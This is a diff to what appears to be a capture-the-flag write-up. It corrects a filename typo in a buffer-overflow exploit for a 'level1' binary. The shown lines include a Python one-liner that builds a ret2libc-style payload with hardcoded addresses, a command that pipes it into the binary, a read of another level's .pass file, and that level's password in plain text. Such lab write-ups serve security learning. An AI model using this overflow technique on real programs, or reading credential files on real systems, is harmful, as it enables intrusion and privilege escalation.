@@ -23,7 +23,7 @@ Then a shell string to serve as system argument.
 ## Shooting
 
 python -c 'print "A"*76 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x29\x88\x04\x08"' > /tmp/payload_level1
-cat /tmp/payaload_level1 - | ./level1
+cat /tmp/payload_level1 - | ./level1
 
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
